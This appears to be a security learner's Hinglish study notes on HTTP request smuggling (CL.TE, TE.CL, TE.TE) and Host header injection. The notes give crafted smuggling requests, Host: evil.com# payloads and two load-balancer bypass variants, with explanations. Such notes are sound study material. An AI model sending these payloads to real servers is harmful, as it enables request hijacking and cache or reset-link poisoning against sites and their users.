Exploiting Vulnerabilities: 
           HTTP request Smuggling:
                 CE.TL:
                     request: 
                         POST / HTTP/1.1
                         Host: vuln.domain.com
                         Connection: Keep-alive
                         Content-type: application/x-www-form-urlencoded
                         Content-Length: 6
                         Transfer-Encoding: chunked
                         
                         0
                         
                         G
                         
                     why content-Length is six, content length is the size of body of request, body allways start after the break line which is given after the last header, \r\n also consider and have siz2 2bytes so:
                     0\r\n -> 1+2bytes , \r\n -> 2bytes , G -> 1byte = 6bytes, remember last word ke baad \r\n nhi dete ,and agar body mein beech mein line break hoto waha \r\n size mein count hota hai ,but last header ke baad jo line break hai usske liye \r\n consider nhi krte
                     
                     now if attack was successful hogaya, toh pehli baar yein request bhejne par normal hi dikhenga , lekin jab hum turant ek aur post request bhejnge toh ,server error dega , unknown GPOST method 
                     
                   TE.CL:
                     request:
                        POST / HTTP/1.1
                        Host: vlun.domain.com
                        Content-Type: application/x-www-form-urlencoded
                        Content-Length: 4
                        Transfer-Encoding: chunked
                        
                        5c
                        GPOST / HTTP/1.1
                        Content-Type: application/x-www-form-urlencoded
                        Content-Length: 6
                        
                        x=1
                        0
                        
                     TE.TE: rarely happens
                       request:
                         POST / HTTP/1.1
                        Host: vlun.domain.com
                        Content-Type: application/x-www-form-urlencoded
                        Content-Length: 4
                        Transfer-Encoding: chunked
                        Transfer-Encoding: cow
                        
                        5c
                        GPOST / HTTP/1.1
                        Content-Type: application/x-www-form-urlencoded
                        Content-Length: 6
                        
                        x=1
                        0
                        
                        here backend server must get confused because of two transer encoding header and he will consider content-length in that particular case
                        
HOST Header attack:  jo request hum burpsuite par dekhte hai browser ke niklne ke baad hi uska destination fix hogaya tha ki usse at last mein apne domain.com par jana hai, aur request hamesha wahi jati hai...
Host header: yein header server ke liye hota hai ,jab request domain.com par pahuche gi , toh server first line of request GET /login HTTP/1.1 mein se /login and host header : domain.com mein se domain.com utha kr , http://domain.com/login dekhta hai ke user ne kahi mujhe request bheji hai ya user mujhse chata hai ke mein kahi aur request bheju , like jab project import krte time hum gitlab mein krte the:

          simple attack: replacing Host: domain.com -> Host: evil.com#
              see image in this folder : host-header-simple-attack.jpg
          but loadbalancer can blacklist simple host header attack: 
                            ways to bypass loadbalancer:
                                    1) x-forwared-host header
                                          Host: domain.com
                                          X-Forwarded-Host: evil.com#
                                    2) giving space in first host:
                                           Host: domain.com         
                                          Host: evil.com#
                                    check ss for both : host-header-loadbalacer-bypass
        
